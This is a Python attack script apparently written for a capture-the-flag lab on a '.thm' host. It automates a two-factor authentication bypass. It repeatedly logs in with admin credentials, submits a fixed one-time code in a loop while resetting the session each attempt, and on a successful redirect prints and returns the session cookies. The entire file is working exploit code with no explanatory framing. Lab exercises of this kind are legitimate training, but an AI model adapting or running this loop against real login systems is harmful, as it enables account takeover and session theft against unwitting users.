import requests

login_url = 'http://login'
otp_url = 'http://login/mfa'
dashboard_url = 'http://login/dashboard'

# Define login credentials
credentials = {
    'email': 'admin@mail',
    'password': 'password'
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://mfa.thm',
    'Connection': 'close',
    'Referer': 'http://login/mfa',
    'Upgrade-Insecure-Requests': '1'
}

def is_login_successful(response):
    return "User Verification" in response.text and response.status_code == 200

def login(session):
    response = session.post(login_url, data=credentials, headers=headers)
    return response
  
def submit_otp(session, otp):
    otp_data = {
        'code-1': otp[0],
        'code-2': otp[1],
        'code-3': otp[2],
        'code-4': otp[3]
    }
    
    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  
    print(f"DEBUG: OTP submission response status code: {response.status_code}")
    
    return response

def is_login_page(response):
    return "Sign in to your account" in response.text or "Login" in response.text

def try_until_success():
    otp_str = '1337' 

    while True: 
        session = requests.Session()  
        login_response = login(session)  
        
        if is_login_successful(login_response):
            print("Logged in successfully.")
        else:
            print("Failed to log in.")
            continue

        print(f"Trying OTP: {otp_str}")

        response = submit_otp(session, otp_str)

        if is_login_page(response):
            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}")
            continue

        if response.status_code == 302:
            location_header = response.headers.get('Location', '')
            print(f"Session cookies: {session.cookies.get_dict()}")

            if location_header == '/labs/third/dashboard':
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")
                return session.cookies.get_dict()  # Return session cookies after successful bypass
            elif location_header == '/labs/third/':
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Unexpected redirect location: {location_header}. OTP: {otp_str}")
        else:
            print(f"Received status code {response.status_code}. Retrying...")

try_until_success()
